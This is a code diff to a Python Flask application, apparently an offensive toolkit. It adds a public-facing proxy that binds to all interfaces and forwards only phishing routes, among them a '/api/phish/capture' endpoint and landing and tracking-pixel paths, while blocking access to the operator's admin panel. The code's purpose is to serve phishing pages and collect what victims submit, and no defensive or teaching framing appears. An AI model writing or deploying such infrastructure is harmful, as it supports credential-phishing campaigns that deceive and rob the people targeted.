@@ -15,6 +15,9 @@ import re
 import logging
 import uuid
 import datetime
+import urllib.request
+import urllib.error
+from http.server import HTTPServer, BaseHTTPRequestHandler
 from flask import Flask, render_template, request, jsonify, Response, stream_with_context
 from flask_cors import CORS
 
@@ -195,6 +198,86 @@ def api_kill(job_id):
 def api_jobs():
     with proc_lock:
         return jsonify({'active': list(active_procs.keys())})
+
+# ── Public-service proxy (isolates phishing pages from admin panel) ───────────
+_pub_proxy_srv  = None
+_pub_proxy_port = None
+_pub_proxy_lock = threading.Lock()
+
+_PUB_ALLOWED = ('/p/', '/api/phish/capture', '/api/phish/px/', '/api/phish/land/')
+
+class _PubProxyHandler(BaseHTTPRequestHandler):
+    def _allowed(self):
+        return any(self.path.startswith(a) for a in _PUB_ALLOWED)
+
+    def _forward(self):
+        if not self._allowed():
+            self.send_response(403)
+            self.send_header('Content-Type', 'text/plain; charset=utf-8')
+            self.end_headers()
+            self.wfile.write(b'403 Forbidden - admin panel is not exposed via this proxy.')
+            return
+        try:
+            length = int(self.headers.get('Content-Length', 0))
+            body   = self.rfile.read(length) if length > 0 else None
+            skip   = {'host', 'connection', 'transfer-encoding'}
+            hdrs   = {k: v for k, v in self.headers.items() if k.lower() not in skip}
+            req = urllib.request.Request(
+                f'http://127.0.0.1:5000{self.path}',
+                data=body, headers=hdrs, method=self.command
+            )
+            with urllib.request.urlopen(req, timeout=30) as resp:
+                self.send_response(resp.status)
+                skip_resp = {'transfer-encoding', 'connection'}
+                for k, v in resp.headers.items():
+                    if k.lower() not in skip_resp:
+                        self.send_header(k, v)
+                self.end_headers()
+                self.wfile.write(resp.read())
+        except urllib.error.HTTPError as e:
+            self.send_response(e.code)
+            self.end_headers()
+            try: self.wfile.write(e.read())
+            except: pass
+        except Exception as ex:
+            self.send_response(502)
+            self.end_headers()
+            self.wfile.write(f'Proxy error: {ex}'.encode())
+
+    do_GET = do_POST = _forward
+    def log_message(self, *a): pass
+
+@app.route('/api/public/start', methods=['POST'])
+def api_public_start():
+    global _pub_proxy_srv, _pub_proxy_port
+    data = request.json or {}
+    port = int(data.get('port', 8080))
+    with _pub_proxy_lock:
+        if _pub_proxy_srv:
+            _pub_proxy_srv.shutdown()
+            _pub_proxy_srv = None
+        try:
+            srv = HTTPServer(('0.0.0.0', port), _PubProxyHandler)
+            _pub_proxy_port = port
+            _pub_proxy_srv  = srv
+            threading.Thread(target=srv.serve_forever, daemon=True).start()
+            return jsonify({'ok': True, 'port': port})
+        except Exception as e:
+            return jsonify({'error': str(e)}), 500
+
+@app.route('/api/public/stop', methods=['POST'])
+def api_public_stop():
+    global _pub_proxy_srv, _pub_proxy_port
+    with _pub_proxy_lock:
+        if _pub_proxy_srv:
+            _pub_proxy_srv.shutdown()
+            _pub_proxy_srv  = None
+            _pub_proxy_port = None
+    return jsonify({'ok': True})
+
+@app.route('/api/public/status')
+def api_public_status():
+    return jsonify({'running': _pub_proxy_srv is not None, 'port': _pub_proxy_port})
 
 @app.route('/api/is_root')
 def api_is_root():
